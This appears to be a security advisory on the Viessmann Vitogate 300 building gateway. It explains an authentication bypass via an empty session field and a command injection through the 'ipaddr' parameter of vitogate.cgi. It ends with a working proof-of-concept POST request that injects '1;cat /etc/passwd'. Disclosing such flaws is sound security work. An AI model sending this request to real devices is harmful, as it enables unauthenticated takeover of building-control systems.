# Information

**Affected product:** Vitogate 300

**Vendor of the product:** Viessmann

**Product page:** https://connectivity.viessmann.com/gb/mp-fp/vitogate/vitogate-300-bn-mb.html

**Affected system version:** 2.1.3.0 and lower

**Firmware download address:** https://connectivity.viessmann.com/gb/mp-fp/vitogate/vitogate-300-bn-mb/release-historie.html

**Reported by:**  WentaoYang (pushe4x@gmail.com)



# Description

Vitogate 300 is a gateway for connecting the Viessmann LON to the BACnet or Modbus. An issue in the component /cgi-bin/vitogate.cgi allows unauthenticated attacker to bypass authentication and execute arbitrary commands via a crafted request.



# Vulnerability details

The vulnerability was detected in the `/ugw/httpd/html/cgi-bin/vitogate.cgi` binary.

## Authentication bypass vulnerability

Analyzing the `/ugw/httpd/html/cgi-bin/vitogate.cgi` , It accepts a data in JSON format through HTTP POST. Then use `isValidSession` function to check the `session` item to determine whether the client has logged in.

![image-20230820044139157](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230820044139157.png)

However, the `isValidSession` function only checks whether the `session` item exists, but not whether the value is valid。

![image-20230820044200248](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230820044200248.png)

Therefore, attacker can set an empty `session` item to bypass the authentication.

## Command injection vulnerability

When the `form` field in JSON data is ` form-4-7` or  ` form-4-8`, the corresponding  function with the same name will be called.

In this two functions, the contents of the `ipaddr` will be concatenated into the command string without any filtering. Then, the `popen` will be called with the command string executed as an argument.

![image-20230820041501154](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230820041501154.png)

To sum up, an unauthenticated attacker can set an empty `session` field to bypass the authentication, gain administrator privileges, and then inject arbitrary malicious commands using `ipaddr` field, thus gaining control of the remote systems.



# POC:

Send the following request to the vulnerable server:

```
POST /cgi-bin/vitogate.cgi HTTP/1.1
Host: VULNERABLE_SERVER_IP
Content-Length: 76
Content-Type: application/json

{"method":"put","form":"form-4-8","session":"","params":{"ipaddr":"1;cat /etc/passwd"}}
```

After the attack, the output of the commands will show in the HTTP response:

![image-20230820051743463](https://raw.githubusercontent.com/Push3AX/vul/main/pic/image-20230820051743463.png)
